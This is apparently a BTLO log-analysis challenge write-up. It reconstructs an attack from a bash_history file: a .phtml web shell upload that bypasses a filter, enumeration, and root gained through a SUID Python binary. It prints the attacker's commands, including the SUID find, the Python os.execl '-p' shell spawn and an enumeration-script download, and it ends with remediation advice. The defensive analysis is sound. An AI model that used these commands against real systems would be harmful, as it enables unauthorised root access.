# BTLO Log Analysis - Privilege Escalation

## Overview
Log analysis challenge involving a `bash_history` file recovered from a compromised web server. The attacker uploaded a PHP web shell by bypassing the upload filter, used it to get shell access, enumerated the box, and escalated to root by abusing a misconfigured SUID binary.

## Evidence
`bash_history` from the compromised host (web root at `/var/www/html/uploads/`).

## Analysis / Findings

### 1. Non-root user on the server
While enumerating `/home`, the attacker found and pivoted through:
```
cd /home/daniel/
```
**User: `daniel`**

### 2. Recon / privesc script download
The attacker pulled down a well-known Linux privilege escalation enumeration script:
```
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```
**Script: `linux-exploit-suggester.sh`** — checks kernel version, installed packages, and known CVEs to suggest privesc paths.

### 3. Packet analyzer tool
```
tcpdump
```
**Tool: `tcpdump`** — likely used to check for sniffable cleartext credentials/traffic on the box.

### 4. Upload filter bypass
The final cleanup command reveals the shell filename:
```
rm /var/www/html/uploads/x.phtml
```
**Extension: `.phtml`**

The developer's filter almost certainly blocklisted `.php` (or similar single-extension checks) but didn't account for alternate PHP-executable extensions (`.phtml`, `.php3/4/5`, `.pht`). Since most Apache/PHP configs still map `.phtml` to the PHP handler, this let the attacker achieve RCE despite the filter.

### 5. Root escalation via SUID misconfiguration
Sequence of commands leading to root:
```
find / -type f -user root -perm -4000 2>/dev/null
./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
- `find ... -perm -4000` enumerates all SUID binaries owned by root.
- The attacker found that `/usr/bin/python` had the SUID bit set.
- They spawned a shell via Python's `os.execl()`, passing `-p` to the shell to **preserve privileges** (UID/GID) — the technique documented on GTFOBins for SUID Python.

Because a normally non-SUID binary (`python`) was misconfigured with the SUID bit, executing it handed the attacker a root-owned shell.

**Answer: 4 - SUID**

## Attack Chain Summary
1. **Initial Access** — Uploaded a malicious PHP web shell disguised with a `.phtml` extension to bypass the upload filter (`x.phtml`).
2. **Foothold** — Executed commands through the web shell (`id`, `whoami`, directory enumeration).
3. **Lateral Movement / User Discovery** — Identified user `daniel` in `/home`.
4. **Interactive Shell Upgrade** — Used a Python PTY spawn (`pty.spawn("/bin/sh")`) to get a proper TTY.
5. **Enumeration** — Ran extensive recon: `sudo -l`, `crontab -l`, `/etc/passwd`, `/etc/shadow`, SSH keys, network config, `iptables`, `last`, and downloaded `linux-exploit-suggester.sh`.
6. **Privilege Escalation** — Found SUID `python` binary via `find / -perm -4000`, abused it with `os.execl("/bin/sh","sh","-p")` to gain root.
7. **Cleanup** — Removed the web shell (`rm /var/www/html/uploads/x.phtml`) to cover tracks.

## Key Takeaways / Remediation
- **Upload filters** should use allowlists (not blocklists) and validate file content/MIME type, not just extension.
- **Disable PHP execution** in upload directories via web server config (`.htaccess` / `php_admin_flag engine off` or similar).
- **SUID bits** should never be set on interpreters like `python`, `perl`, `bash`, etc. Regularly audit with `find / -perm -4000` from the defensive side too.
- Restrict/monitor outbound `wget`/`curl` from web server processes to catch tool downloads like LES.
- Enable auditd/history logging that can't be trivially cleared by an attacker with shell access.
